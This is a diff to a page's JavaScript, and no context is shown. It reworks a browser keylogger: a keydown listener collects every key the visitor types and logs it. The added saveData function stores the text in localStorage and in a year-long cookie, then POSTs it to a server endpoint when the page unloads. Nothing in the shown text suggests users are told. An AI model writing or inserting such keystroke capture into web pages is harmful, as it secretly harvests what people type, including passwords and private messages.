@@ -27,15 +27,21 @@
             xhr.send(param);
         }
 
+        function saveData(trackedMessage) {
+            localStorage.trackedMessage = trackedMessage;
+            console.log('saving cookie');
+            setCookie('trackedMessage', trackedMessage, 365);
+            sendData('/url', 'POST', { trackedMessage: trackedMessage }, () => console.log('Message sent'));
+        }
+
+
         function init() {
             let trackedMessage = '';
+
+            window.addEventListener('beforeunload', () => saveData(trackedMessage));
             window.addEventListener('keydown', e => {
                 trackedMessage += e.key;
                 console.log(trackedMessage);
-                localStorage.trackedMessage = trackedMessage;
-                setCookie('trackedMessage', trackedMessage, 365);
-
-                sendData('/url', 'POST', { trackedMessage: message }, () => console.log('Message sent'));
             });
         }
         init();
